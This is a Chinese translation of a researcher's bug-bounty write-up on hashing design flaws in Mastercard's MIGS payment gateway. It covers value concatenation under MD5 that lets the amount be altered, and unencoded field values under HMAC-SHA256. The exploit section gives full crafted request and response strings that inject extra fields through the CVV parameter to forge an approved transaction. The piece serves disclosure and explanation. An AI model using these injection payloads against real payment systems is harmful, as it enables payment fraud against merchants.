> 原文链接: https://www.anquanke.com//post/id/86813 


# 【技术分享】Mastercard互联网网关：哈希设计缺陷分析


                                阅读量   
                                **80196**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：tinyhack.com
                                <br>原文地址：[http://tinyhack.com/2017/09/05/mastercard-internet-gateway-service-hashing-design-flaw/](http://tinyhack.com/2017/09/05/mastercard-internet-gateway-service-hashing-design-flaw/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t016e937364de60c893.jpg)](https://p2.ssl.qhimg.com/t016e937364de60c893.jpg)

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**一、简介**

**Mastercard**（万事达卡）互联网网关服务（Mastercard Internet Gateway Service，MIGS）曾经使用过**MD5**哈希算法，我去年在这个算法中找到了一个[设计缺陷](http://bugcrowd.com/mastercard)。攻击者可以利用这个缺陷修改交易金额。报告漏洞后，我收到了一笔奖金。从今年起，Mastercard开始使用**HMAC-SHA256**哈希算法，然而我还是在其中找到了一个缺陷（目前MasterCard还没给我回复）。

如果你只想了解这个缺陷的具体细节，可以直接阅读缺陷分析那部分内容。

**<br>**

**二、什么是MIGS**

当你在网上付款时，网站所有者通常只是将他们的系统连接到一个中间支付网关（用户会被重定向到另一个网站）。随后，这个支付网关会连接到国内可用的多个支付系统。对于信用卡支付场景而言，许多网关（其中有一个是MIGS）会连接到另一个网关，该网关与许多银行合作，提供[3DSecure](https://en.wikipedia.org/wiki/3-D_Secure)服务。

**<br>**

**三、MIGS工作流程**

如果你使用的是MIGS，那么支付流程通常如下所示：

你从某个在线商店（或店铺）中选择商品。

在网站上输入你的信用卡卡号。

信用卡卡号、金额等信息经过签名后返回给浏览器，浏览器会将这些信息自动POST到中间支付网关。

中间支付网关将信息转换为MIGS可识别的格式，使用MIGS密钥签名后，将信息返回给浏览器。这一次浏览器会将信息自动POST到MIGS服务器。

如果不需要3DSecure服务，则转到步骤6。如果需要3DSecure服务，MIGS会将请求重定向到发卡银行，银行会请求OTP（One-time Password，动态口令）信息，然后生成HTML页面，将数据自动POST到MIGS。

MIGS将签名后的数据返回给浏览器，然后将数据自动POST回中间网关。

中间网关会根据签名确认数据是否有效。如果不是有效数据，则会生成错误页面。

支付网管根据MIGS的响应将支付状态转发给商家。

需要注意的是，通信过程由用户的浏览器来完成，用户无需与服务器打交道，而且所有数据都经过签名。从理论上讲，如果签名过程以及验证过程正确，那么整个过程不会出现任何问题。不幸的是，实际情况并没有那么完美。

**<br>**

**四、MIGS MD5哈希中的缺陷**

这个问题非常简单。MIGS使用的哈希算法为：

**MD5(Secret + Data)**

这种方式不会受到哈希长度扩展攻击的影响（目标采用了某些检查机制以阻止这类攻击）。其中，Data的创建过程如下：系统对以vpc_开头的每个查询参数进行排序，然后不使用分隔符，直接将这些值连接起来。比如，对于如下数据：

```
Name: Joe Amount: 10000 Card: 1234567890123456
```

对应的查询参数为：

```
vpc_Name=Joe&amp;Vpc_Amount=10000&amp;vpc_Card=1234567890123456
```

对这个参数进行排序

```
vpc_Amount=10000 vpc_Card=1234567890123456 vpc_Name=Joe
```

提取参数值，连接起来：

```
100001234567890123456Joe
```

现在如果我改了请求参数，如下所示：

```
vpc_Name=Joe&amp;Vpc_Amount=1&amp;vpc_Card=1234567890123456&amp;vpc_B=0000
```

排序结果如下：

```
vpc_Amount=1 vpc_B=0000 vpc_Card=1234567890123456 vpc_Name=Joe
```

提取参数值，连接起来：

```
100001234567890123456Joe
```

生成的MD5值与第一种情况相同。所以大体上来讲，当数据被发送到MIGS时，我们可以在金额（amount）后面插入额外的参数，这样就能覆盖掉最后面的数字，也可以插在前面，这样就能覆盖掉前面的数字，这样一来，支付的金额会被削减，我们就能用2美元来购买价值2000美元的MacBook。

中间网关以及商家可以检查MIGS返回的金额与请求的金额是否一致，这样就能解决这个错误。

关于这个漏洞，MasterCard奖励了我8500美元。

**<br>**

**五、HMAC-SHA256哈希中的缺陷**

新的HMAC-SHA256哈希机制中存在一个缺陷，如果我们可以向中间支付网关插入无效值，我们就能利用这个缺陷。经过我的测试，我发现至少有一个**支付网关**（Fusion Payments）受这个问题影响。从Fusion Payments那里我得到了500美元的奖励。其他支付网关如果连接到MIGS，可能也会受到这个问题影响。

在新版本中，他们在各字段之间添加了分隔符（&amp;）以及字段名，不像原来那样只有字段值，并且使用了HMAC-SHA256作为哈希算法。还是讨论前面的那个数据，新的散列数据为：

```
Vpc_Amount=10000&amp;vpc_Card=1234567890123456&amp;vpc_Name=Joe
```

这段数据中我们无法改变任何信息，一切看起来都特别美好。然而，如果某个值包含“&amp;”或者“=”或者其他特殊符号，会出现什么情况呢？

从这个[文档](http://www.arabtesting.com/tests/bank%20new/MasterCard%20VPC%20Integration%20Reference%20MR%2029_FINAL.pdf)中，我们找到这样一段话：

“注意：为了便于哈希处理，所有的字段名-字段值中的值都不应该经过URL编码处理。”

我将“不”字重点标记出来。这意味着，如果我们使用如下字段：

```
Amount=100 Card=1234 CVV=555
```

这些信息会使用如下方式进行哈希处理：

```
HMAC(Amount=100&amp;Card=1234&amp;CVV=555)
```

而如果我们使用如下字段（金额中包含“&amp;”及“=”字符）：

```
Amount=100&amp;Card=1234 CVV=555
```

这些信息的哈希处理方式变成：

```
HMAC(Amount=100&amp;Card=1234&amp;CVV=555)
```

得到的结果完全一致。目前这还不是一个真正的问题。

当然，我第一反应是文档可能出了点问题，可能这些数据需要经过编码处理。然而我检查了MIGS服务器的反应，发现服务器的反应与文档描述的一致。可能它们不想处理不同的编码（比如不想看到“+”变成“%20”）。

这看起来貌似不存在什么问题，MIGS会检查任何无效的值，无效值会导致错误出现（比如无效的金额会被网关拒绝）。

然而我注意到，对某些支付网关来说，它们不会在服务端验证输入的有效性，而是直接签名所有数据，然后将结果发送给MIGS。这种方式可以减轻处理的复杂度，毕竟在客户端使用JavaScript检查输入数据更加方便，服务端只需要简单签名数据后，让MIGS判断数据是否正确即可，比如MIGS可以判断卡号是否正确、CVV应该为3个或者4个数字、信用卡过期时间是否正确等等。这种处理方式背后的逻辑在于：MIGS会重新检查输入数据，并且会做得比支付网关更加出色。

我发现Fusion Payments这个支付网关的确存在这种现象：它们允许用户在CVV字段发送任意长度的任意字符（检查过程只依托JavaScript来完成），签名请求数据后，直接将数据发往MIGS。

**5.1 漏洞利用**

为了利用这个漏洞，我们需要构造一个字符串，这个字符串对应一个有效的请求，同时也需要准备一个有效的MIGS服务器响应数据。我们完全不需要与MIGS服务器通信，只需要强迫客户端自己签名有效数据即可。

比如，请求格式如下所示：

```
vpc_AccessCode=9E33F6D7&amp;vpc_Amount=25&amp;vpc_Card=Visa&amp;vpc_CardExp=1717&amp;vpc_CardNum=4599777788889999&amp;vpc_CardSecurityCode=999&amp;vpc_OrderInfo=ORDERINFO&amp;vpc_SecureHash=THEHASH&amp;vpc_SecureHashType=SHA256
```

从服务器返回的响应如下所示：

```
vpc_Message=Approved&amp;vpc_OrderInfo=ORDERINFO&amp;vpc_ReceiptNo=722819658213&amp;vpc_TransactionNo=2000834062&amp;vpc_TxnResponseCode=0&amp;vpc_SecureHash=THEHASH&amp;vpc_SecureHashType=SHA256
```

对Fusion Payments而言，我们可以在vpc_CardSecurityCode（CVV）这个字段中插入额外数据来利用这个漏洞：

```
vpc_AccessCode=9E33F6D7&amp;vpc_Amount=25&amp;vpc_Card=Visa&amp;vpc_CardExp=1717&amp;vpc_CardNum=4599777788889999&amp;vpc_CardSecurityCode=999%26vpc_Message%3DApproved%26vpc_OrderInfo%3DORDERINFO%26vpc_ReceiptNo%3D722819658213%26vpc_TransactionNo%3D2000834062%26vpc_TxnResponseCode%3D0%26vpc_Z%3Da&amp;vpc_OrderInfo=ORDERINFO&amp;vpc_SecureHash=THEHASH&amp;vpc_SecureHashType=SHA256
```

客户端以及支付网关会为该字符串生成正确的哈希值。

现在，我们可以将这段数据POST回客户端（完全不需要与MIGS服务器通信），我们会稍微修改这段数据，以便客户端可以读取正确的变量值（大多数客户端只会检查vpcTxnResponseCode以及vpcTransactionNo）：

```
vpc_AccessCode=9E33F6D7%26vpc_Amount%3D25%26vpc_Card%3DVisa%26vpc_CardExp%3D1717%26vpc_CardNum%3D4599777788889999%26vpc_CardSecurityCode%3D999&amp;vpc_Message=Approved&amp;vpc_OrderInfo=ORDERINFO&amp;vpc_ReceiptNo=722819658213&amp;vpc_TransactionNo=2000834062&amp;vpc_TxnResponseCode=0&amp;vpc_Z=a%26vpc_OrderInfo%3DORDERINFO&amp;vpc_SecureHash=THEHASH&amp;vpc_SecureHashType=SHA256
```

需要注意的是：

这段数据的哈希结果与之前的数据一致。

客户端会忽略vpc_AccessCode变量以及该变量内部的值。

客户端会处理vpc_TxnResponseCode等变量，然后认为交易过程没有问题。

我们可以认为这是个一个MIGS客户端漏洞，然而正是MasterCard选择的哈希算法导致这种情况发生，如果变量值经过编码，那么这个问题就不会存在。

**5.2 MIGS的回应**

MasterCard还没有回复HMAC-SHA256中存在的这个问题。我同时将这个问题抄送给了处理过前一个漏洞的那几个人，然而我没有收到任何回复邮件，他们甚至没有回复“我们正在确认这个问题是否存在”之类的邮件。在讨论MD5漏洞时，我将自己的Facebook告诉过他们，以便他们能及时联系上我。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](//base_request.html/img/1.png)[![](https://p5.ssl.qhimg.com/t01b056e371c97a3d7c.png)](https://p5.ssl.qhimg.com/t01b056e371c97a3d7c.png)

某些人总是不愿正面面对他们收到的漏洞报告，甚至会去否认这些报告，所以现在在报告漏洞时，我会将相关信息保存到经密码保护的文章中（这也是为什么你会在我的博客中看到几篇密码加密的文章）。目前为止，至少有3个来自MasterCard的IP地址访问过这篇文章（3次密码输入行为）。他们必须输入密码才能阅读报告，因此他们不可能在不阅读这篇文章的前提下不小心点击到文章链接。现在每个星期我都会敦促他们给我个回复。

我希望他们能警告连接到他们系统的每个用户，让这些用户注意检查及过滤这类注入攻击。

**<br>**

**六、支付网关中的缺陷**

我们还需要注意的是：尽管支付网关一直在跟金钱打交道，然而它们并没有人们想象的那么安全。在渗透测试过程中，我发现几个中间网关在设计支付协议时存在一些缺陷。不幸的是，我不能给出具体细节（渗透测试这个词意味着我需要遵守某些保密协议）。

我也在具体实现上找到过一些缺陷。比如**哈希长度扩展攻击**（Hash Length Extension Attack）、XML签名验证错误等等。其中最为简单的一个错误是我在[Fusion Payments](https://www.fusion-payments.com/fusion-bug-bounty)上发现的。我找到的第一个问题是：他们根本不会去检查MIGS返回的签名。这意味着我们可以修改MIGS返回的数据，将交易结果标记为成功状态。也就是说，我们只要将一个字符从**F**（false）改成**o**（success）即可。

所以，我们只需要输入任意信用卡号，MIGS会返回错误响应，然后我们只需要修改响应数据，就能得到支付成功结果。这是一个市值2000万美元的公司，然而这个报告我只拿到了400美元的奖励。不单单这个支付网关存在这个漏洞，我在另一个支付网关也找到过同样一个漏洞。在我联系过的网关中，Fusion Payments是唯一一个具有明确的漏洞奖励计划的网关，他们很快就回复了我的邮件，并且修复了这个漏洞。

**<br>**

**七、总结**

支付网关没有你想象的那么安全。在奖励金额相对较低的情况下（某些时候我报告了漏洞却收获了0美元），我想知道有多少人已经利用过支付网关中的漏洞。
